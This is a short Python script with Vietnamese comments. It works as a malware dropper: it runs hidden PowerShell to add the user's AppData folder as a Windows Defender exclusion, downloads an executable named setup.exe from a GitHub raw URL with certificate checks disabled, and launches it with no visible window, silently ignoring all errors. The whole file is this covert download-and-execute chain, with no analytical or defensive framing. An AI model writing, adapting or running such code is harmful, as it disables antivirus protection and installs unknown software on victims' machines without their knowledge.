import subprocess
import os
import urllib.request
import ssl

# --- CẤU HÌNH ---
url = "https://raw.githubusercontent.com/skibidi36361/Run/refs/heads/main/setup.exe"
destination = os.path.join(os.environ['AppData'], "setup.exe")

# 1. Thêm ngoại lệ cho Windows Defender (Chạy ẩn)
defender_cmd = f"Add-MpPreference -ExclusionPath '{os.environ['AppData']}'"
try:
    subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", defender_cmd], 
                   capture_output=True, shell=False)
except:
    pass

# 2. Tải file và xử lý SSL
try:
    ssl_context = ssl._create_unverified_context()
    with urllib.request.urlopen(url, context=ssl_context) as response, open(destination, 'wb') as out_file:
        out_file.write(response.read())
except:
    pass

# 3. Thực thi file .exe ngầm
if os.path.exists(destination):
    try:
        # CREATE_NO_WINDOW đảm bảo không có cửa sổ console nào hiện lên
        subprocess.Popen([destination], creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
